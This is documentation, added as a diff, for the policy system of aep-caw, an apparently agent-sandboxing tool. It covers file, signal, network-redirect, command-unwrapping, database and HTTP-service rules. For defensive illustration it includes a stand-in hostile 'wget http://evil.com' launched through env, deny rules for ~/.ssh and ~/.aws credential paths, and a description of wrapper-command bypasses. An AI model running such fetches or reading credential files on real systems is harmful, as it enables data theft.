@@ -1,0 +1,539 @@
+# Policies
+
+This guide covers policy configuration and management for aep-caw.
+
+## Policy Variables
+
+Policies support variable substitution using `${VAR}` syntax. Variables are expanded at session creation time, allowing policies to be portable across different projects and environments.
+
+### Built-in Variables
+
+| Variable | Description | Example Value |
+|----------|-------------|---------------|
+| `${PROJECT_ROOT}` | Auto-detected project root (nearest go.mod, package.json, Cargo.toml, etc.) | `/home/user/myproject` |
+| `${GIT_ROOT}` | Nearest .git directory (may differ from PROJECT_ROOT in monorepos) | `/home/user/monorepo` |
+| `${HOME}` | User's home directory (from environment) | `/home/user` |
+| `${TMPDIR}` | System temp directory (from environment) | `/tmp` |
+
+On Windows, additional variables are available:
+| Variable | Description | Example Value |
+|----------|-------------|---------------|
+| `${USERPROFILE}` | User's profile directory | `C:\Users\user` |
+| `${APPDATA}` | Application data directory | `C:\Users\user\AppData\Roaming` |
+| `${LOCALAPPDATA}` | Local application data | `C:\Users\user\AppData\Local` |
+| `${TEMP}` / `${TMP}` | Temp directory | `C:\Users\user\AppData\Local\Temp` |
+
+### How Project Root Detection Works
+
+When a session is created, aep-caw walks up from the workspace directory looking for project markers. The detection follows this logic:
+
+1. **Language markers** (go.mod, package.json, Cargo.toml, pyproject.toml) set `PROJECT_ROOT`
+2. **.git directory** sets `GIT_ROOT` (and `PROJECT_ROOT` if no language marker found)
+3. If no markers found, `PROJECT_ROOT` defaults to the workspace directory
+
+**Monorepo example:**
+```
+/home/user/monorepo/           <- GIT_ROOT (.git here)
+  ├── services/
+  │   └── api/                 <- PROJECT_ROOT (go.mod here)
+  │       └── cmd/             <- workspace (session started here)
+  └── frontend/
+      └── package.json
+```
+
+The default project markers are:
+- `.git`
+- `go.mod`
+- `package.json`
+- `Cargo.toml`
+- `pyproject.toml`
+
+### Fallback Syntax
+
+Use `${VAR:-fallback}` to provide a default value when a variable is undefined:
+
+```yaml
+paths:
+  # Use git root if available, otherwise project root
+  - "${GIT_ROOT:-${PROJECT_ROOT}}/**"
+
+  # Use TMPDIR from environment, fall back to /tmp
+  - "${TMPDIR:-/tmp}/**"
+
+  # Empty fallback (variable becomes empty string if undefined)
+  - "${OPTIONAL_PATH:-}/**"
+```
+
+### Example: Using Variables in Policies
+
+```yaml
+file_rules:
+  # Allow full access to project files
+  - name: allow-project
+    paths:
+      - "${PROJECT_ROOT}/**"
+    operations: ["*"]
+    decision: allow
+
+  # Read-only access to monorepo root (for shared configs)
+  - name: allow-monorepo-read
+    paths:
+      - "${GIT_ROOT}/**"
+    operations: [read, stat, list]
+    decision: allow
+
+  # Block access to credentials
+  - name: deny-credentials
+    paths:
+      - "${HOME}/.ssh/**"
+      - "${HOME}/.aws/**"
+    operations: ["*"]
+    decision: deny
+```
+
+## Server Configuration
+
+### Project Root Detection Settings
+
+In your server configuration (`server-config.yaml`):
+
+```yaml
+policies:
+  dir: "/etc/aep-caw/policies"
+  default: "dev-safe"
+
+  # Enable/disable automatic project root detection (default: true)
+  detect_project_root: true
+
+  # Custom project markers (optional, overrides defaults)
+  project_markers:
+    - ".git"
+    - "go.mod"
+    - "package.json"
+    - "Cargo.toml"
+    - "pyproject.toml"
+    - "setup.py"           # Add Python setup.py
+    - "pom.xml"            # Add Maven projects
+    - ".aep-caw-root"      # Custom marker file
+```
+
+### Disabling Detection
+
+**Server-wide** (in config):
+```yaml
+policies:
+  detect_project_root: false
+```
+
+**Per-session** (CLI):
+```bash
+# Disable detection, use workspace as PROJECT_ROOT
+aep-caw exec --no-detect-root SESSION -- cmd
+
+# Explicit project root (skips detection)
+aep-caw exec --project-root /path/to/project SESSION -- cmd
+```
+
+**Per-session** (API):
+```json
+{
+  "workspace": "/home/user/project/subdir",
+  "detect_project_root": false,
+  "project_root": "/home/user/project"
+}
+```
+
+## Platform-Specific Policies
+
+aep-caw provides separate policy files for Unix/macOS and Windows:
+
+| Policy | Unix/macOS | Windows |
+|--------|-----------|---------|
+| Development | `dev-safe.yaml` | `dev-safe-windows.yaml` |
+| Agent Sandbox | `agent-sandbox.yaml` | `agent-sandbox-windows.yaml` |
+| CI Strict | `ci-strict.yaml` | `ci-strict-windows.yaml` |
+| Default | `default.yaml` | `default-windows.yaml` |
+| System Read-only | `system-readonly.yaml` | (cross-platform) |
+
+Windows policies include:
+- Windows file paths (`C:\Program Files\**`, `${APPDATA}\**`)
+- Windows registry rules (`HKCU\SOFTWARE\*`, etc.)
+- Windows-specific commands (`dir`, `type`, `findstr`, `msbuild`)
+- NuGet package registry access
+
+## File Rule Actions on macOS (ESF)
+
+On macOS, file I/O enforcement uses the Endpoint Security Framework (ESF) instead of Linux FUSE. ESF AUTH events are binary allow/deny -- there is no transparent file interception. This means actions that rely on interception on Linux are implemented as deny + async guidance on macOS. The end results are equivalent, but the mechanism differs.
+
+| Action | Linux (FUSE) | macOS (ESF) |
+|--------|-------------|-------------|
+| `allow` | Operation permitted, event logged | Same -- operation permitted via `es_respond_auth_result(ALLOW)`, event logged |
+| `deny` | Operation blocked, event logged | Same -- operation blocked via `es_respond_auth_result(DENY)`, event logged |
+| `redirect` | FUSE transparently rewrites the path; the process sees the alternative path as if it were the original | Operation **denied** at the ESF level. The agent receives guidance indicating the alternative path to use. This is a "deny + guidance" approach -- the agent must retry using the suggested path. |
+| `soft_delete` | FUSE intercepts the unlink and preserves the file transparently; the process believes the delete succeeded | Deletion **denied** via ESF and the file is preserved. The agent receives guidance explaining the file is protected. Same end result (file preserved) but via denial instead of transparent interception. |
+| `approve` | Operation held pending human approval; the process blocks until approved or denied | Operation **denied** via ESF and an approval flow is triggered asynchronously. If approved, the agent must retry the operation. |
+
+**Key takeaway:** On Linux, FUSE can transparently intercept and modify file operations mid-flight. On macOS, ESF can only allow or deny. Actions that require interception (`redirect`, `soft_delete`, `approve`) are implemented as deny + async notification/guidance, and the agent is expected to act on that guidance (e.g., retry with the redirected path, or retry after approval is granted).
+
+## Signal Rules
+
+Signal rules control how signals (kill, terminate, stop, etc.) can be sent between processes within an aep-caw session. This provides protection against runaway processes, accidental signal delivery to critical services, and enables graceful shutdown patterns.
+
+### Platform Support
+
+| Platform | Blocking | Redirect | Audit |
+|----------|----------|----------|-------|
+| Linux | Yes (seccomp) | Yes | Yes |
+| macOS | No | No | Yes (ES) |
+| Windows | Partial | No | Yes (ETW) |
+
+### Signal Specification
+
+Signals can be specified in three ways:
+
+| Format | Example | Description |
+|--------|---------|-------------|
+| Name | `SIGKILL`, `SIGTERM`, `SIGHUP` | Standard signal name |
+| Number | `9`, `15`, `1` | Numeric signal value |
+| Group | `@fatal`, `@job`, `@reload` | Predefined signal group |
+
+#### Predefined Signal Groups
+
+| Group | Signals |
+|-------|---------|
+| `@fatal` | SIGKILL, SIGTERM, SIGQUIT, SIGABRT |
+| `@job` | SIGSTOP, SIGCONT, SIGTSTP, SIGTTIN, SIGTTOU |
+| `@reload` | SIGHUP, SIGUSR1, SIGUSR2 |
+| `@ignore` | SIGCHLD, SIGURG, SIGWINCH |
+| `@all` | All signals (1-31) |
+
+### Target Types
+
+Target types define which processes can receive signals:
+
+| Type | Description |
+|------|-------------|
+| `self` | Process sending to itself |
+| `children` | Direct children of sender |
+| `descendants` | All descendants |
+| `siblings` | Processes with same parent |
+| `session` | Any process in aep-caw session |
+| `parent` | The aep-caw supervisor |
+| `external` | PIDs outside session |
+| `system` | PID 1 and kernel threads |
+| `user` | Other processes owned by same user |
+| `process` | Match by process name pattern |
+| `pid_range` | Match by PID range |
+
+### Decision Types
+
+| Decision | Behavior |
+|----------|----------|
+| `allow` | Allow signal |
+| `deny` | Block signal (EPERM) |
+| `audit` | Allow + log |
+| `approve` | Require manual approval |
+| `redirect` | Change signal (e.g., SIGKILL to SIGTERM) |
+| `absorb` | Silently drop (no error to sender) |
+
+### Example Configuration
+
+```yaml
+signal_rules:
+  - name: allow-self-and-children
+    signals: ["@all"]
+    target:
+      type: self
+    decision: allow
+
+  - name: graceful-kill
+    signals: ["SIGKILL"]
+    target:
+      type: children
+    decision: redirect
+    redirect_to: SIGTERM
+
+  - name: deny-external-fatal
+    signals: ["@fatal"]
+    target:
+      type: external
+    decision: deny
+    fallback: audit
+    message: "Blocking signal to external process"
+
+  - name: protect-database
+    signals: ["@fatal"]
+    target:
+      type: process
+      pattern: "postgres*"
+    decision: deny
+```
+
+## Network Redirect Rules
+
+Network redirect rules transparently reroute DNS queries and TCP connections, enabling use cases like routing LLM API calls through corporate proxies or switching AI providers without code changes.
+
+### Platform Support
+
+| Feature | Linux | macOS | Windows |
+|---------|-------|-------|---------|
+| DNS Redirect | ✅ eBPF | ✅ pf/proxy | ✅ WinDivert |
+| Connect Redirect | ✅ eBPF | ✅ pf/proxy | ✅ WinDivert |
+| SNI Rewrite | ✅ | ✅ | ✅ |
+
+### DNS Redirect
+
+Intercept DNS resolution for specific hostnames and return configured IP addresses:
+
+```yaml
+dns_redirect:
+  - match: "api.anthropic.com"       # Exact match
+    redirect_ip: "10.0.0.50"
+    visibility: audit_only
+    on_failure: fail_closed
+
+  - match: ".*\\.openai\\.com"       # Regex pattern
+    redirect_ip: "10.0.0.51"
+    visibility: warn
+```
+
+| Field | Description |
+|-------|-------------|
+| `match` | Hostname pattern (exact string or regex) |
+| `redirect_ip` | IP address to return instead |
+| `visibility` | `silent`, `audit_only`, or `warn` |
+| `on_failure` | `fail_closed`, `fail_open`, or `retry_original` |
+
+### Connect Redirect
+
+Redirect TCP connections to different destinations with optional TLS handling:
+
+```yaml
+connect_redirect:
+  - match: "api.anthropic.com:443"
+    redirect_to: "vertex-proxy.internal:8443"
+    tls_mode: passthrough
+    visibility: silent
+
+  - match: "api.openai.com:443"
+    redirect_to: "azure-proxy.internal:443"
+    tls_mode: rewrite_sni
+    rewrite_sni: "azure-openai.example.com"
+    visibility: audit_only
+```
+
+| Field | Description |
+|-------|-------------|
+| `match` | `hostname:port` pattern (exact or regex) |
+| `redirect_to` | `host:port` destination |
+| `tls_mode` | `passthrough` (default) or `rewrite_sni` |
+| `rewrite_sni` | SNI value for TLS ClientHello (when `tls_mode: rewrite_sni`) |
+| `visibility` | `silent`, `audit_only`, or `warn` |
+
+### How It Works
+
+1. **DNS Redirect**: When a process resolves a hostname matching a rule, aep-caw intercepts the DNS response and returns the configured IP. A correlation map stores the hostname→IP mapping.
+
+2. **Connect Redirect**: When a process connects to an IP:port, aep-caw checks the correlation map to find the original hostname, evaluates redirect rules, and transparently redirects the connection.
+
+3. **TLS Handling**: In `passthrough` mode, encrypted traffic flows unchanged. In `rewrite_sni` mode, aep-caw modifies the SNI in the TLS ClientHello before forwarding.
+
+### Visibility Options
+
+| Value | Behavior |
+|-------|----------|
+| `silent` | Redirect without logging or user notification |
+| `audit_only` | Log the redirect but don't notify user |
+| `warn` | Log and display a warning to user |
+
+### Failure Handling Options
+
+| Value | Behavior |
+|-------|----------|
+| `fail_closed` | If redirect fails, block the connection |
+| `fail_open` | If redirect fails, allow original connection |
+| `retry_original` | Try redirect, fall back to original on failure |
+
+### Example Use Cases
+
+**Route LLM APIs through corporate gateway:**
+```yaml
+dns_redirect:
+  - match: "api.anthropic.com"
+    redirect_ip: "10.1.1.100"
+    visibility: audit_only
+
+connect_redirect:
+  - match: "api.anthropic.com:443"
+    redirect_to: "llm-gateway.corp.local:443"
+    tls_mode: passthrough
+```
+
+**Switch from OpenAI to Azure OpenAI:**
+```yaml
+connect_redirect:
+  - match: "api.openai.com:443"
+    redirect_to: "mycompany.openai.azure.com:443"
+    tls_mode: rewrite_sni
+    rewrite_sni: "mycompany.openai.azure.com"
+```
+
+## Transparent Commands
+
+Transparent commands are wrapper/interpreter commands (like `env`, `sudo`, `nice`) that don't perform meaningful work themselves - they just launch another command. When execve interception is enabled, aep-caw automatically "unwraps" these wrappers to find and evaluate the real payload command against policy.
+
+### How It Works
+
+1. A process calls `execve("/usr/bin/env", ["env", "wget", "http://evil.com"])`
+2. aep-caw recognizes `env` as a transparent command
+3. It unwraps to find the payload: `wget`
+4. Both `env` (wrapper) and `wget` (payload) are evaluated against command rules
+5. The **most restrictive** decision wins - if either is denied, the execution is denied
+
+This prevents bypass attacks where a blocked command is launched through an allowed wrapper.
+
+### Built-in Transparent Commands
+
+| Platform | Commands |
+|----------|----------|
+| All | `env`, `nice`, `nohup`, `sudo`, `time`, `xargs` |
+| Linux | `busybox`, `doas`, `strace`, `ltrace`, `ld-linux*` |
+| Windows | `cmd.exe`, `powershell.exe`, `pwsh.exe`, `wsl.exe` |
+
+### Policy Configuration
+
+You can add or remove transparent commands via the `transparent_commands` policy field:
+
+```yaml
+# Add custom wrappers or remove built-in ones
+transparent_commands:
+  add:
+    - myrunner        # Custom launcher that wraps commands
+    - taskrunner      # CI task runner
+  remove:
+    - sudo            # Don't unwrap sudo (treat as opaque command)
+```
+
+### Unwrap Behavior
+
+- **Depth limit:** Chained wrappers are unwrapped up to 5 levels deep (e.g., `sudo nice env wget`)
+- **Flag skipping:** Flags (`-x`, `--flag=value`) and environment assignments (`FOO=bar`) are skipped to find the payload
+- **Double-dash:** `--` ends flag parsing; the next argument is always the payload
+- **Fail-safe:** If the heuristic identifies the wrong argument as the payload, it will not match any command rule and hit default-deny - the safe outcome
+
+### Audit Events
+
+When transparent unwrapping occurs, audit events include additional fields:
+
+| Field | Description |
+|-------|-------------|
+| `unwrapped_from` | The original wrapper command (e.g., `/usr/bin/env`) |
+| `payload_command` | The unwrapped payload (e.g., `wget`) |
+| `raw_filename` | Original path before symlink canonicalization |
+
+These fields help detect bypass attempts in audit logs.
+
+## Database Policies
+
+### Require WHERE For Sensitive Mutations
+
+Use `require_where: true` on narrow mutation rules when accidental full-table updates or deletes are the main risk:
+
+```yaml
+database_rules:
+  - name: allow-scoped-user-mutations
+    db_service: appdb
+    operations: [modify, delete]
+    relations: ["public.users"]
+    match_object_resolution: catalog_resolved
+    require_where: true
+    decision: allow
+```
+
+This rule allows `UPDATE public.users SET disabled = true WHERE id = 123` when the relation selector matches, but it does not cover `UPDATE public.users SET disabled = true`. The guard checks only that a top-level `WHERE` exists; it does not prove the predicate is selective or tenant-safe. It is also only a rule matcher: if another unguarded `allow`, `audit`, or `approve` rule covers the same `modify` or `delete` effect, a no-WHERE mutation can still be permitted.
+
+## HTTP Services
+
+`http_services:` declares named HTTP upstreams that child processes can reach through the proxy gateway. Declaring a service also blocks direct HTTP/HTTPS connections to its upstream host (and any aliases) from the child process - traffic must flow through the gateway where the declared rules are enforced.
+
+### Complete policy example
+
+```yaml
+version: 1
+name: agent-with-github
+
+# Allow agents to use tools
+command_rules:
+  - name: allow-git
+    commands: [git]
+    decision: allow
+
+# Declare one HTTP service: GitHub API read access, approve on writes
+http_services:
+  - name: github
+    upstream: https://api.github.com
+    expose_as: GITHUB_API_URL
+    aliases: [api.github.com]
+    allow_direct: false    # default; blocks direct calls to api.github.com
+    default: deny
+
+    rules:
+      - name: read-issues
+        methods: [GET]
+        paths:
+          - /repos/*/*/issues
+          - /repos/*/*/issues/*
+        decision: allow
+        message: "reading issues is allowed"
+
+      - name: create-issue-needs-approval
+        methods: [POST]
+        paths:
+          - /repos/*/*/issues
+        decision: approve
+        message: "Agent wants to create an issue: approve?"
+        timeout: 5m
+```
+
+Child processes receive `GITHUB_API_URL=http://127.0.0.1:PORT/svc/github/` in their environment. Code that calls the GitHub API should use that variable as its base URL.
+
+### Fail-closed host guard
+
+When `allow_direct: false` is set (the default), any direct outbound connection to the upstream host or its aliases is blocked at the network layer and logged as an `http_service_denied_direct` event. The agent can only reach the service through the `/svc/<name>/` gateway.
+
+Set `allow_direct: true` only as an escape hatch when a third-party SDK cannot be configured to use a custom base URL.
+
+### Approval gating
+
+Rules with `decision: approve` use the same approvals manager as other approve rules in aep-caw. The target shown to the approver is the request path including the query string. See [`docs/approval-auth.md`](../approval-auth.md) for approval channel configuration and anti-self-approval protections.
+
+### Rule evaluation order
+
+Rules are evaluated in declaration order. The first rule whose `methods` and `paths` both match wins. If no rule matches, the service's `default` applies (`deny` when not set). `paths` are compiled as glob patterns with `/` as the separator - `*` matches within a single path segment, not across segments; use `**` for multi-segment matches.
+
+## Troubleshooting
+
+### Variable Not Expanding
+
+If a variable like `${PROJECT_ROOT}` appears literally in logs:
+
+1. Check that the policy file uses the correct syntax (`${VAR}`, not `$VAR`)
+2. Verify the variable is defined (check session creation logs)
+3. For undefined variables without fallbacks, session creation will fail with an error
+
+### Wrong Project Root Detected
+
+If the wrong directory is detected as PROJECT_ROOT:
+
+1. Check which marker files exist in parent directories
+2. Use `--project-root` to override detection
+3. Add a custom marker file (e.g., `.aep-caw-root`) and configure `project_markers`
+
+### Checking Detected Values
+
+The detected PROJECT_ROOT and GIT_ROOT are included in session information:
+
+```bash
+# Via API
+curl http://localhost:18080/api/v1/sessions/SESSION_ID | jq '.project_root, .git_root'
+```
